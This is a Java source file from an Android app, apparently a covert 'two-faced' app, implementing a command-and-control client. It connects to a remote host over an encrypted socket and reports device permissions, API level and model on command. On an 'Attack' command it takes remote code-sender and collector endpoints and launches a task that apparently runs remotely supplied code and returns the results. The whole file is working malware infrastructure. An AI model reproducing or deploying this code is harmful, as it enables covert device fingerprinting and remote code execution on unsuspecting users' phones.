package com.android.app_2_faces_net;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.android.app_2_faces_net.util.DeviceUtils;
import com.android.app_2_faces_net.util.ParamParser;

import java.io.IOException;

public class CommunicationTask implements Runnable {
    private static final String TAG = "Communication Task";

    private final Context context;

    private final String socketMainHostname;
    private final int socketMainPort;
    private boolean isAlive;


    private CryptedSocket socketMain;


    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
        this.isAlive = false;
    }

    @Override
    public void run() {
        try {
            this.socketMain = new CryptedSocket(this.socketMainHostname, this.socketMainPort);
            this.socketMain.connect();

            this.socketMain.write("alive");
            this.isAlive = true;

            while (this.isAlive) {
                String commandReceived = this.socketMain.read();

                String toSend;
                switch (commandReceived) {
                    case "Permissions":
                        toSend = DeviceUtils.getPermissions(this.context, false);
                        break;
                    case "Permissions granted":
                        toSend = DeviceUtils.getPermissions(this.context, true);
                        break;
                    case "API":
                        toSend = DeviceUtils.getApiLevel();
                        break;
                    case "Model":
                        toSend = DeviceUtils.getDeviceModel();
                        break;
                    case "Attack":
                        CryptedSocket[] codeSenderSockets = ParamParser.parseCodeSenders(this.socketMain.read());
                        CryptedSocket collectorSocket = ParamParser.parseSocketCollector(this.socketMain.read());

                        String resultTypeString = ParamParser.parseResultType(this.socketMain.read());
                        String argString = ParamParser.parseArg(this.socketMain.read());
                        int polling = ParamParser.parsePolling(this.socketMain.read());
                        int reps = ParamParser.parseReps(this.socketMain.read());

                        TaskRunner.getInstance().execute(new CompilationTask(this.context, collectorSocket, codeSenderSockets, resultTypeString, argString, polling, reps));

                        toSend = "Starting";
                        break;
                    case "Close":
                        this.isAlive = false;
                        toSend = "Closing";
                        break;
                    default:
                        toSend = "Unknown command";
                }

                this.socketMain.write(toSend);
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            Log.d(TAG, Log.getStackTraceString(e));
            this.socketMain.close();
        }

        this.socketMain.close();
    }
}
